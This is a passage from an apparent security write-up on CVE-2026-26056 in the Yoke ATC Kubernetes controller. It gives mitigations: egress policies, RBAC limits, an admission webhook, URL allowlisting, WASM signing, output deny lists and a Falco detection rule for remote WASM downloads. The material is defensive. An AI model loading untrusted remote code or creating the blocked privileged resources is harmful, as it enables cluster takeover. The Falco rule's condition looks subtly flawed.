kind: NetworkPolicy
metadata:
  name: atc-egress-restriction
  namespace: atc
spec:
  podSelector:
    matchLabels:
      app: atc
  policyTypes:
  - Egress
  egress:
  # Allow DNS
  - to:
    - namespaceSelector:
        matchLabels:
          name: kube-system
    ports:
    - protocol: UDP
      port: 53
  # Allow Kubernetes API
  - to:
    - namespaceSelector: {}
    ports:
    - protocol: TCP
      port: 6443
  # Block all other egress (prevents downloading external WASM)
```

**3. RBAC Hardening**

Limit who can create Custom Resources:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: backend-creator
rules:
- apiGroups: ["examples.com"]
  resources: ["backends"]
  verbs: ["create", "update"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: trusted-backend-creators
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: backend-creator
subjects:
# Only bind to trusted ServiceAccounts
- kind: ServiceAccount
  name: ci-cd-deployer
  namespace: production
```

**4. Validating Admission Webhook**

Deploy a webhook to reject CRs with override annotations:

```go
// admission-webhook/validator.go
func (v *Validator) ValidateBackend(ctx context.Context, backend *Backend) error {
    // Reject any CR with flight override annotation
    if flight, exists := backend.Annotations["overrides.yoke.cd/flight"]; exists {
        return fmt.Errorf(
            "annotation 'overrides.yoke.cd/flight' is forbidden (CVE-2026-26056 mitigation): %s", 
            flight,
        )
    }
    return nil
}
```

### Architectural Fixes (For Yoke Maintainers)

**1. URL Validation and Allowlisting**

Implement strict URL validation:

```go
// pkg/flight/loader.go
type FlightLoader struct {
    AllowedDomains []string
    RequireHTTPS   bool
}

func (fl *FlightLoader) ValidateURL(rawURL string) error {
    parsedURL, err := url.Parse(rawURL)
    if err != nil {
        return fmt.Errorf("invalid URL: %w", err)
    }
    
    // Require HTTPS in production
    if fl.RequireHTTPS && parsedURL.Scheme != "https" {
        return fmt.Errorf("only HTTPS URLs allowed, got: %s", parsedURL.Scheme)
    }
    
    // Check against allowlist
    allowed := false
    for _, domain := range fl.AllowedDomains {
        if parsedURL.Host == domain || strings.HasSuffix(parsedURL.Host, "."+domain) {
            allowed = true
            break
        }
    }
    
    if !allowed {
        return fmt.Errorf("domain not in allowlist: %s", parsedURL.Host)
    }
    
    return nil
}
```

**2. Content Verification (Checksums/Signatures)**

Require cryptographic verification of WASM modules:

```go
// Flight manifest includes checksum
type FlightManifest struct {
    URL      string
    SHA256   string
    Signature string  // GPG or cosign signature
}

func (fl *FlightLoader) LoadWithVerification(manifest FlightManifest) error {
    wasmBytes, err := fl.download(manifest.URL)
    if err != nil {
        return err
    }
    
    // Verify checksum
    actualHash := sha256.Sum256(wasmBytes)
    expectedHash, _ := hex.DecodeString(manifest.SHA256)
    if !bytes.Equal(actualHash[:], expectedHash) {
        return fmt.Errorf("checksum mismatch: integrity violation")
    }
    
    // Verify signature
    if err := fl.verifySignature(wasmBytes, manifest.Signature); err != nil {
        return fmt.Errorf("signature verification failed: %w", err)
    }
    
    return fl.instantiate(wasmBytes)
}
```

**3. Separate Concerns (Metrics vs Business Logic)**

The permission check validates `airways` updates, but this seems unrelated to the actual functionality. Consider:

- **Separate RBAC resource for code execution**: `flightexecution.yoke.cd/overrides`
- **Explicit permission required**: Users must have `create` verb on this resource to use overrides
- **Audit logging**: All override usage logged to immutable audit trail

**4. Principle of Least Privilege**

ATC should **not** run with `cluster-admin`. Instead:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: atc-restricted
rules:
# Only allow managing resources explicitly defined in Airways
- apiGroups: ["apps"]
  resources: ["deployments", "statefulsets"]
  verbs: ["get", "list", "watch", "create", "update", "patch"]
- apiGroups: [""]
  resources: ["services", "configmaps"]
  verbs: ["get", "list", "watch", "create", "update", "patch"]
# Explicitly deny RoleBinding creation
# (Not possible in RBAC, but document the intent)
```

### Best Practices for WASM-Based Controllers

**1. Treat WASM as Untrusted**

Even though WASM runs in a sandbox, **the output is trusted**. Apply the same validation to WASM output as you would to any user input:

```go
func (c *Controller) ApplyFlightOutput(output []byte) error {
    var resources []unstructured.Unstructured
    if err := json.Unmarshal(output, &resources); err != nil {
        return err
    }
    
    // Validate each resource before applying
    for _, resource := range resources {
        if err := c.validateResource(resource); err != nil {
            return fmt.Errorf("flight output validation failed: %w", err)
        }
    }
    
    return c.apply(resources)
}

func (c *Controller) validateResource(resource unstructured.Unstructured) error {
    // Deny dangerous resource types
    forbidden := []string{"ClusterRoleBinding", "ClusterRole", "PodSecurityPolicy"}
    if slices.Contains(forbidden, resource.GetKind()) {
        return fmt.Errorf("flight attempted to create forbidden resource: %s", resource.GetKind())
    }
    
    // Validate namespacing
    if resource.GetNamespace() == "" && !c.isClusterScoped(resource.GetKind()) {
        return fmt.Errorf("namespace-scoped resource missing namespace: %s", resource.GetName())
    }
    
    return nil
}
```

**2. WASM Module Signing**

Implement a signing scheme similar to container image signing (cosign):

```bash
# Sign WASM module
cosign sign-blob --key cosign.key flight.wasm > flight.wasm.sig

# Verify before loading
cosign verify-blob --key cosign.pub --signature flight.wasm.sig flight.wasm
```

**3. Admission Controller Validation**

Use OPA (Open Policy Agent) to enforce policies on CRs with annotations:

```rego
# policy/deny-flight-overrides.rego
package kubernetes.admission

deny[msg] {
    input.request.kind.kind == "Backend"
    input.request.object.metadata.annotations["overrides.yoke.cd/flight"]
    msg := "Flight overrides are not allowed in production namespaces"
}
```

**4. Runtime Monitoring**

Monitor for suspicious WASM activity:

```yaml
# Falco rule for detecting WASM downloads
- rule: Suspicious_WASM_Download_By_Controller
  desc: Detect when a controller downloads a WASM module from external URL
  condition: >
    proc.name = "atc" and
    evt.type = "connect" and
    (fd.sip.name != "localhost" and fd.sip.name != "127.0.0.1") and
    fd.sport = 80 or fd.sport = 443
  output: >
    Controller downloading external WASM
    (proc=%proc.name connection=%fd.sip.name:%fd.sport)
  priority: WARNING
```

---

## Lessons Learned: Broader Security Implications

This vulnerability teaches us several important lessons that extend beyond Yoke.

### Lesson 1: Flexibility Is a Security Trade-Off

The `overrides.yoke.cd/flight` annotation exists for good reasons:
- Enables rapid development iteration
- Allows organization-specific customization
- Facilitates debugging and troubleshooting

But **every flexibility feature is a potential attack vector**. The security community must shift from "enable by default, restrict on hardening" to "deny by default, enable with explicit trust decisions."

**Design Principle:** Features that cross trust boundaries (user input → privileged execution) should require explicit opt-in and strong authentication.

### Lesson 2: Sandboxing ≠ Security

WebAssembly's sandboxing is excellent at preventing:
- Memory corruption exploits
- Direct system calls
- File system access
- Network access

But it's **completely ineffective** against logical attacks. If the WASM module's job is to generate Kubernetes resources, and you run malicious WASM, it will generate malicious resources—completely within spec.

**Design Principle:** Sandbox execution, validate output. Never trust that sandboxed code has benign intent.

### Lesson 3: Annotations Are User Input

Too many Kubernetes controllers treat annotations as trusted metadata. They're not. Annotations are **unvalidated user input** that should be treated with the same suspicion as:

- HTTP query parameters
- Form inputs
- JSON payloads

**Design Principle:** All annotation values must be validated, sanitized, and restricted before use in security-sensitive contexts.

### Lesson 4: Confused Deputy Attacks in Cloud-Native

This vulnerability is a textbook Confused Deputy scenario:

- **The Deputy (ATC)**: Has high privileges (cluster-admin)
- **The Attacker**: Has low privileges (CR create)
- **The Confusion**: ATC acts on user input without verifying authority

The cloud-native ecosystem creates countless Deputy scenarios:
- Controllers reconciling user-defined CRs
- Admission webhooks processing user manifests
- Operators executing user-provided scripts

**Design Principle:** When privileged components act on behalf of less-privileged users, verify that the user has authority for the *semantic action*, not just the syntactic operation.

### Lesson 5: Supply Chain Security for WASM Modules

As WASM adoption grows in cloud-native, we need supply chain security practices equivalent to container images:

- **Signing and verification** (like cosign)
- **Vulnerability scanning** (like Trivy for WASM)
- **SBOM for WASM** (dependency transparency)
- **Registry security** (OCI registries for WASM)

**Design Principle:** Treat WASM modules as first-class artifacts requiring the same supply chain security as container images.

### Lesson 6: Defense in Depth for Controllers

ATC had a single point of failure: if the override annotation bypassed validation, the entire system was compromised. Better architecture would include:

1. **Input validation** (annotation allowlisting)
2. **Network restrictions** (egress firewall)
3. **Output validation** (resource type restrictions)
4. **RBAC limitations** (no cluster-admin)
5. **Audit logging** (immutable trail)

Failure of any single layer shouldn't result in total compromise.

**Design Principle:** Assume every layer will fail; design so that no single failure grants full system access.

---

## Conclusion: Securing the Future of Extensible Systems

CVE-2026-26056 is more than a bug—it's a case study in the hidden costs of extensibility. As Kubernetes and cloud-native platforms become increasingly programmable through WASM, operators, plugins, and custom controllers, the attack surface grows exponentially.

### Key Takeaways

**For Developers:**
- Validate all user input, including annotations
- Sandbox execution *and* validate output
- Implement URL allowlisting for remote code loading
- Use cryptographic verification for code artifacts
- Apply principle of least privilege ruthlessly

**For Security Teams:**
- Audit controller RBAC permissions (most don't need cluster-admin)
- Deploy admission webhooks to enforce annotation policies
- Monitor egress traffic from controllers for unusual patterns
- Scan WASM modules like you scan container images
- Test for confused deputy vulnerabilities in custom controllers

**For Kubernetes Users:**
- Understand what annotations your controllers honor
- Restrict who can create/update Custom Resources
- Apply network policies to controller namespaces
- Enable audit logging for privileged controller actions
- Consider disabling override/debug features in production

### The Path Forward

The Yoke team and broader community should:

1. **Patch immediately**: Add URL validation and allowlisting
2. **Disable by default**: Make override annotations opt-in with explicit configuration
3. **Cryptographic verification**: Require signed WASM modules in production
4. **Improved RBAC model**: Separate "deploy app" from "execute code" permissions
5. **Community education**: Publish security guidelines for WASM-based controllers

### Final Thoughts

WebAssembly in Kubernetes represents incredible potential—portable, safe, performant custom logic. But as CVE-2026-26056 demonstrates, **"safe" is context-dependent**. WASM keeps the host safe from the module, but doesn't keep the cluster safe from malicious logic.

As we build increasingly extensible platforms, we must remember: **Every extension point is an attack surface. Every customization feature is a potential exploit. Every flexibility mechanism requires security boundaries.**

The future of cloud-native computing is programmable, extensible, and WASM-powered. Let's make sure it's also secure.

---

## References and Further Reading

- **CVE-2026-26056**: [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2026-26056)
- **GHSA-wj8p-jj64-h7ff**: [GitHub Security Advisory](https://github.com/yokecd/yoke/security/advisories/GHSA-wj8p-jj64-h7ff)
- **Yoke Project**: [GitHub Repository](https://github.com/yokecd/yoke)
- **Yoke Documentation**: [ATC Overview](https://yokecd.github.io/docs/airtrafficcontroller/atc/)
- **CWE-94**: [Improper Control of Generation of Code](https://cwe.mitre.org/data/definitions/94.html)
- **Wazero**: [WebAssembly Runtime for Go](https://wazero.io/)
- **Kubernetes Admission Control**: [Official Documentation](https://kubernetes.io/docs/reference/access-authn-authz/admission-controllers/)

### Acknowledgments

This vulnerability was responsibly disclosed by **[@b0b0haha](https://github.com/b0b0haha)** and **[@lixingquzhi](https://github.com/lixingquzhi)**. Their thorough research and detailed proof-of-concept made this analysis possible.

---

*Stay safe, validate your inputs, and remember: a sandbox is only as secure as the code you choose to run in it.*

*— Auralis, February 2026*
